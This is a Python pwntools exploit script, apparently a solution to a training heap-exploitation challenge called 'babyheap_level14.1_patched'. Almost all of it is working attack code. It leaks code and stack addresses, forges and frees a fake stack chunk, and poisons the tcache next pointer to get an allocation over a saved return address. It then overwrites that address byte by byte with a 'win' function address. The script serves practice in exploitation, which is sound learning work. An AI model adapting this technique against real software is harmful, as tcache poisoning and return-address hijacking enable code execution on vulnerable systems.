#!/usr/bin/env python3

from pwn import * 

binary = './babyheap_level14.1_patched'
p = process(binary)

s = '''
b * main+1117

'''

#gdb.attach(p, s)

context.log_level = 'debug'






# leaking a .text address (get win)
p.sendline("malloc 0 100")
p.sendline("malloc 1 100")


p.sendline(b"scanf")
p.sendline("0")
p.sendline(b"AA")

p.sendline(b"echo 0 0")
p.sendline(b"echo 0 224")

p.recvuntil(b"Data: ")
p.recvuntil(b"Data: ")

leak2 = p.recvuntil(b"\n", drop=True)
leak2 = u64(leak2.ljust(8, b"\x00"))
log.info(f"Leaked address 2: {hex(leak2)}")

win = leak2 - 0xd07

#gdb.attach(p, s)
print(hex(win))




# creating a fake chunk to read addresses on stack
p.sendline(b"stack_scanf " + b'B' * 0x30 + p64(0) + p64(0x201))
# freeing a stack address, then malloc to get a fake chunk 
p.sendline("stack_free")
p.sendline("malloc 4 500")



# using that fake chunk (chunk 4) to leak a stack address for arbitrary write
p.sendline(b"echo 4 64")
p.recvuntil(b"Data: ")

leak1 = p.recvuntil(b"\n", drop=True)
leak1 = u64(leak1.ljust(8, b"\x00"))
log.info(f"Leaked address 1: {hex(leak1)}")
rip = leak1 - 0xe8
log.info(f"Leaked address 1: {hex(rip)}")
#gdb.attach(p, s)




# free some chunks, overwrite next* pointer, malloc'ing a stack address and overwrite it with scanf
p.sendline("free 0")
p.sendline("free 1")


p.sendline(b"scanf")
p.sendline(b"1") 
p.sendline(p64(rip))

p.sendline("malloc 1 100")
p.sendline("malloc 0 100")


gdb.attach(p, s)
p.sendline(b"scanf")
p.sendline(b"0") 

addr = win
p.send(b'\x11') # win+8 because 0x09 is a null byte scanf doesn't accept
p.send(p8((addr >> 8) & 0xff))
p.send(p8((addr >> 16) & 0xff))
p.send(p8((addr >> 24) & 0xff))
p.send(p8((addr >> 32) & 0xff))
p.send(p8((addr >> 40) & 0xff))
p.send(p8((addr >> 48) & 0xff))
p.send(p8((addr >> 56) & 0xff))
p.send(b"\n")


time.sleep(1)
p.sendline("quit")
p.interactive()



